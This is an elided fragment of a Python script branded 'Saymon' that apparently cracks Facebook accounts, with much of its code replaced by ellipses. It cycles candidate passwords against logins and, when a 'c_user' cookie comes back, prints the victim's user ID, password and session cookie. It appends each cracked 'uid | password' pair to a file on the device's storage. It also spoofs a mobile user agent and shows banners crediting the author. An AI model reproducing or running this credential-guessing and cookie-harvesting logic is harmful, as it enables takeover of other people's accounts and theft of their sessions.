...
ha = current.day
today = date.today()
#Saymon2 = "\033[1;33m➤\033[1;32m➤\x1b[0m"
...
try:
    ...
    print('\x1b[1;92m[<\>]\x1b[1;97m \x1b[1;96mSaymon')
...
for x in range(10):
    ...
    l='Mobile WVGA SMM-Saymon/1.2.0 OPN-B'
...
\033[1;92m
 \033[1;92m╔=================================╗
 |\033[1;97m[\033[1;92m❯\033[1;97m]OWNER     \033[1;31m:  \033[1;97mSaymon \033[1;92m           | 
 |\033[1;97m[\033[1;92m❯\033[1;97m]FACEBOOK  \033[1;31m:  \033[1;97mSaymon HASAN \033[1;92m     |   
...
def main():
    ...
    if sh =='2':
       ...
       sh7()
    if sh =='3':
       os.system('xdg-open https://www.facebook.com/tore.xudi.69')
       main()  
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                uid = coki[151:166]
                #os.system("play-audio Saymon_OK.mp3")
                print('\033[1;92m[Saymon-OK] '+uid+' | '+ps+'\033[0;97m')
                #print(f'{B}[NUMBER📳] {K}'+uid+'  ')
                print(f'{B}[COOKIE💉] {H}'+coki)
                cek_apk(session,coki)
                open('/sdcard/Saymon-OK.txt', 'a').write(uid+' | '+ps+'\n')
                ok.append(uid)
                break
            else:
                continue
        loop+=1
        animasi = random.choice(["\x1b[1;91mSaymon","\x1b[1;92mSaymon","\x1b[1;93mSaymon","\x1b[1;94mSaymon","\x1b[1;95mSaymon","\x1b[1;96mSaymon","\x1b[1;97mSaymon","\x1b[1;91mSaymon","\x1b[1;92mSaymon","\x1b[1;93mSaymon","\x1b[1;94mSaymon","\x1b[1;95mSaymon","\x1b[1;96mSaymon"])
